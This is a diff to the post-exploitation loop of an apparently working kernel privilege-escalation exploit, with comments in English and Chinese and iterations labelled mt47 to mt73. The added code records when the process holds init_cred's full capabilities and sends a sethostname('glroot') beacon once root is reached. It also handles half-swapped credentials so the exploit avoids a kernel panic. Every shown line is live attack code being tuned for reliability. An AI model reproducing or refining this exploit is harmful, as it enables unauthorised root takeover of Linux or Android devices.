@@ -602,6 +602,11 @@ int run_exploit(int argc, char **argv) {
 #define SYS_finit_module 273
 #endif
         int root_seen = 0, ksu_done = 0;
+        /* mt73: sticky CapEff-full flag survives status-file blinding after C
+         * swaps cred to init_cred; SELinux kernel-SID blocks file I/O, so the
+         * old live CapEff read is lost exactly when we need it most. */
+        int mt73_capeff_seen = 0;
+        int mt73_c_signal_sent = 0;
         for (int poll_i = 0; poll_i < 2400; poll_i++) {  /* 8 min 窗口 */
           uid_t ruid, euid, suid;
           gid_t rgid, egid, sgid;
@@ -621,6 +626,8 @@ int run_exploit(int argc, char **argv) {
               fclose(st);
             }
           }
+          if (capeff >= 0x000001ffffffffffULL)
+            mt73_capeff_seen = 1;
           int gate_hit;
           if (getenv("PSELECT_PTR_STRICT")) {
             /* mt48 满帽 AND-gate: CapEff==0x1ffffffffff(init_cred 满帽, 只可能来自
@@ -632,7 +639,10 @@ int run_exploit(int argc, char **argv) {
              * 永不引爆 — 这就是 mt32-36 + mt47PTR 7/7 全灭的机制。
              * 旧 OR-gate 的 euid==0 在"只换 cred"半程即真(euid 是 init_cred 完好字段)
              * → setresgid → commit_creds → 指针不等 → BUG → panic 重启。 */
-            gate_hit = (capeff >= 0x000001ffffffffffULL) && (euid == 0);
+            /* mt73: after C lands, /proc/self/status may be denied by SELinux
+             * (SID becomes kernel).  Use the pre-blinding sticky flag instead
+             * of the live capeff read. */
+            gate_hit = mt73_capeff_seen && (euid == 0);
           } else {
             gate_hit = (ruid == 0 || euid == 0 || suid == 0 ||
                         rgid == 0 || egid == 0 || sgid == 0 || capeff != 0);
@@ -642,6 +652,12 @@ int run_exploit(int argc, char **argv) {
             pr_success("mt47: ROOT-SEEN ids uid=%d euid=%d suid=%d gid=%d egid=%d sgid=%d CapEff=%016llx poll=%d\n",
                        ruid, euid, suid, rgid, egid, sgid, capeff, poll_i);
             fflush(stdout);
+            /* mt73: external hostname beacon — sethostname needs CAP_SYS_ADMIN
+             * from init_cred and does not depend on file/status I/O. */
+            if (sethostname("glroot", 6) == 0)
+              pr_info("mt73: sethostname(glroot) signal sent\n");
+            else
+              pr_info("mt73: sethostname failed errno=%d\n", errno);
             /* mt48: fflush 只到页缓存, panic 重启即丢 — 今天日志缺 ROOT-SEEN 的
              * 合理解释。fsync 落盘, 崩了也留证。 */
             fsync(fileno(stdout));
@@ -666,6 +682,19 @@ int run_exploit(int argc, char **argv) {
               pr_info("mt47: setenforce probe wr=%zd errno=%d\n", w2, errno);
               close(efd2);
             }
+            fflush(stdout);
+          }
+          /* mt73: detect C-only half-state (cred=init, real_cred unchanged).
+           * File/status I/O is already blinded, so use sethostname beacon;
+           * do NOT setresuid here (would hit commit_creds BUG_ON). */
+          if (!mt73_capeff_seen && euid == 0 && !mt73_c_signal_sent) {
+            mt73_c_signal_sent = 1;
+            pr_info("mt73: C half-state landed euid=0 (no R stick) - sethostname signal\n");
+            fflush(stdout);
+            if (sethostname("glroot", 6) == 0)
+              pr_info("mt73: sethostname(glroot) signal sent\n");
+            else
+              pr_info("mt73: sethostname failed errno=%d\n", errno);
             fflush(stdout);
           }
           if (root_seen) {
